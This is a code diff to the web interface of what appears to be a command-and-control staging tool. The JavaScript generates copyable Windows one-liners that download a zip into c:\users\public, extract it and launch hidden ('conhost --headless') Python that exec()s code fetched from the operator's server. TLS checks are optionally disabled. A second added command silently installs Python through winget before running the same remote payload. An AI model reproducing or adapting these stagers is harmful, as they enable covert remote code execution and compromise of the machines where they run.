@@ -455,38 +455,57 @@
 
             // Create the command based on trusted certificate setting
             let command;
+            let command2;
             const curlOption = trustedCert ? '-s' : '-ks';
             const pythonCode = trustedCert ? 
                 `"import urllib3;import requests;url='${url}/a/d';exec(requests.get(url).text)"` :
                 `"import urllib3;urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning);import requests;url='${url}/a/d';exec(requests.get(url,verify=False).text)"`;
             
             command = `curl ${curlOption} ${url}/a/p -o c:\\users\\public\\p.zip&cd c:\\users\\public&tar -xf p.zip&del /q p.zip&cd documents&start /b conhost --headless python -c ${pythonCode}`;
-
-            // Display with syntax highlighting
-            document.getElementById('displayArea').innerHTML = `
-                <code style="color: #9cdcfe;">curl</code> <code style="color: #ce9178;">${curlOption}</code> <code style="color: #ce9178;">${url}/a/p</code> <code style="color: #ce9178;">-o</code> <code style="color: #ce9178;">c:\\users\\public\\p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">cd</code> <code style="color: #ce9178;">c:\\users\\public</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">tar</code> <code style="color: #ce9178;">-xf</code> <code style="color: #ce9178;">p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">del</code> <code style="color: #ce9178;">/q</code> <code style="color: #ce9178;">p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">cd</code> <code style="color: #ce9178;">documents</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">start</code> <code style="color: #ce9178;">/b</code> <code style="color: #ce9178;">conhost</code> <code style="color: #ce9178;">--headless</code> <code style="color: #9cdcfe;">python</code> <code style="color: #ce9178;">-c</code> <code style="color: #ce9178;">${formatPythonCode(pythonCode)}
-                ${killDateDisplay}
-                <button id="copyButton" class="btn btn-sm btn-secondary" style="
-                    position: absolute;
-                    top: 5px;
-                    right: 5px;
-                    padding: 2px 8px;
-                    font-size: 12px;
-                    opacity: 0.8;
-                ">
-                    <i class="bi bi-clipboard"></i> Copy
-                </button>`;
             
-            // Add copy functionality
-            document.getElementById('copyButton').addEventListener('click', function() {
-                navigator.clipboard.writeText(command).then(function() {
-                    const originalText = this.innerHTML;
-                    this.innerHTML = '<i class="bi bi-check"></i> Copied!';
-                    setTimeout(() => {
-                        this.innerHTML = originalText;
-                    }, 2000);
-                }.bind(this));
-            });
+            command2 = trustedCert ? 
+                `winget install --accept-package-agreements -s msstore 9PJPW5LDXLZ5 >NUL & start /b conhost --headless pip install requests & start /b conhost --headless python -c "import requests; url='${url}/a/d'; exec(requests.get(url).text)"` :
+                `winget install --accept-package-agreements -s msstore 9PJPW5LDXLZ5 >NUL & start /b conhost --headless pip install requests & start /b conhost --headless python -c "import urllib3; urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning); import requests; url='${url}/a/d'; exec(requests.get(url, verify=False).text)"`;
+
+           // Display with syntax highlighting and separate copy buttons
+document.getElementById('displayArea').innerHTML = `
+    <div style="position: relative; margin-bottom: 15px; background-color: #1e1e1e; padding: 10px; border-radius: 4px;">
+        <code style="color: #9cdcfe;">curl</code> <code style="color: #ce9178;">${curlOption}</code> <code style="color: #ce9178;">${url}/a/p</code> <code style="color: #ce9178;">-o</code> <code style="color: #ce9178;">c:\\users\\public\\p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">cd</code> <code style="color: #ce9178;">c:\\users\\public</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">tar</code> <code style="color: #ce9178;">-xf</code> <code style="color: #ce9178;">p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">del</code> <code style="color: #ce9178;">/q</code> <code style="color: #ce9178;">p.zip</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">cd</code> <code style="color: #ce9178;">documents</code><code style="color: #d4d4d4;">&</code><code style="color: #9cdcfe;">start</code> <code style="color: #ce9178;">/b</code> <code style="color: #ce9178;">conhost</code> <code style="color: #ce9178;">--headless</code> <code style="color: #9cdcfe;">python</code> <code style="color: #ce9178;">-c</code> <code style="color: #ce9178;">${formatPythonCode(pythonCode)}</code>
+        <button class="copy-btn" data-cmd="${escapeHtml(command)}" style="position: absolute; top: 5px; right: 5px; padding: 2px 8px; font-size: 12px; background: #3a3d41; border: none; color: white; border-radius: 3px; cursor: pointer;">
+            <i class="bi bi-clipboard"></i> Copy
+        </button>
+    </div>
+    <div style="position: relative; background-color: #1e1e1e; padding: 10px; border-radius: 4px;">
+        <code style="color: #9cdcfe;">winget</code> <code style="color: #ce9178;">install</code> <code style="color: #ce9178;">--accept-package-agreements</code> <code style="color: #ce9178;">-s</code> <code style="color: #ce9178;">msstore</code> <code style="color: #ce9178;">9PJPW5LDXLZ5</code> <code style="color: #ce9178;"></code> <code style="color: #d4d4d4;">></code><code style="color: #ce9178;">NUL</code> <code style="color: #d4d4d4;">&</code> <code style="color: #9cdcfe;">start</code> <code style="color: #ce9178;">/b</code> <code style="color: #ce9178;">conhost</code> <code style="color: #ce9178;">--headless</code> <code style="color: #9cdcfe;">pip</code> <code style="color: #ce9178;">install</code> <code style="color: #ce9178;">requests</code> <code style="color: #d4d4d4;">&</code> <code style="color: #9cdcfe;">start</code> <code style="color: #ce9178;">/b</code> <code style="color: #ce9178;">conhost</code> <code style="color: #ce9178;">--headless</code> <code style="color: #9cdcfe;">python</code> <code style="color: #ce9178;">-c</code> <code style="color: #ce9178;">${formatPythonCode(pythonCode)}</code>
+        <button class="copy-btn" data-cmd="${escapeHtml(command2)}" style="position: absolute; top: 5px; right: 5px; padding: 2px 8px; font-size: 12px; background: #3a3d41; border: none; color: white; border-radius: 3px; cursor: pointer;">
+            <i class="bi bi-clipboard"></i> Copy
+        </button>
+    </div>
+    ${killDateDisplay}`;
+
+// Add copy functionality for both buttons
+document.querySelectorAll('.copy-btn').forEach(btn => {
+    btn.addEventListener('click', function() {
+        const cmd = this.getAttribute('data-cmd');
+        navigator.clipboard.writeText(cmd).then(() => {
+            const originalText = this.innerHTML;
+            this.innerHTML = '<i class="bi bi-check"></i> Copied!';
+            setTimeout(() => {
+                this.innerHTML = originalText;
+            }, 2000);
+        });
+    });
+});
+
+// Helper function to escape HTML (needed if commands contain special chars)
+function escapeHtml(unsafe) {
+    return unsafe
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+}
         }
 
         // Helper function to format Python code with syntax highlighting
